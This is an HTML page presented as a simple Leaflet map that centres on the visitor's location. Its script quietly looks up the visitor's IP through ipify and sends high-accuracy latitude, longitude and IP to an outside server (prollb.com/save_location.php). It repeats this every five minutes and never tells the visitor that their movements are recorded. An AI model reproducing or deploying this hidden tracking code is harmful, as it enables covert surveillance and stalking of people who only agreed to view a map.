<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Map with User Location</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body, html { margin: 0; padding: 0; height: 100%; }
        #map { height: 100vh; width: 100vw; }
    </style>
</head>
<body>

<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
<script>
    // Initialize the map centered on a default location
    const map = L.map('map').setView([0, 0], 2);  // Start with a global view

    // Load and display OpenStreetMap tiles
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: 'Â© OpenStreetMap contributors'
    }).addTo(map);

    // Function to fetch the user's IP address
    async function getIpAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP address:', error);
            return null;
        }
    }

    // Function to send location data to the backend
    async function sendLocationData(lat, lng, userIp) {
        const data = {
            latitude: lat,
            longitude: lng,
            user_id: userIp,
        };

        try {
            const response = await fetch('https://prollb.com/save_location.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams(data)
            });
            const result = await response.text();
            console.log("Server response:", result);
        } catch (error) {
            console.error('Error posting location data:', error);
        }
    }

    // Request user location on page load
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            // Success callback
            async function(position) {
                const userLat = position.coords.latitude;
                const userLng = position.coords.longitude;

                // Fetch the user's IP address
                const userIp = await getIpAddress();

                // Center map on user's location
                map.setView([userLat, userLng], 14);  // Zoom in to user's location

                // Add a marker at user's location
                L.marker([userLat, userLng]).addTo(map)
                    .bindPopup("You are here!")
                    .openPopup();

                // Store user's location in local storage
                localStorage.setItem('userLocation', JSON.stringify({ latitude: userLat, longitude: userLng, ipAddress: userIp }));
                console.log("User location stored:", { latitude: userLat, longitude: userLng, ip: userIp });

                // Send initial location data
                await sendLocationData(userLat, userLng, userIp);

                // Set up an interval to send location every 5 minutes (300,000 milliseconds)
                setInterval(async () => {
                    navigator.geolocation.getCurrentPosition(async function(updatedPosition) {
                        const updatedLat = updatedPosition.coords.latitude;
                        const updatedLng = updatedPosition.coords.longitude;

                        // Send updated location data
                        await sendLocationData(updatedLat, updatedLng, userIp);
                    });
                }, 300000); // 5 minutes in milliseconds
            },
            // Error callback
            function(error) {
                console.error("Error getting location:", error);
                alert("Location access is required for this feature.");
            },
            // Options for higher accuracy
            { enableHighAccuracy: true }
        );
    } else {
        alert("Geolocation is not supported by this browser.");
    }
</script>

</body>
</html>
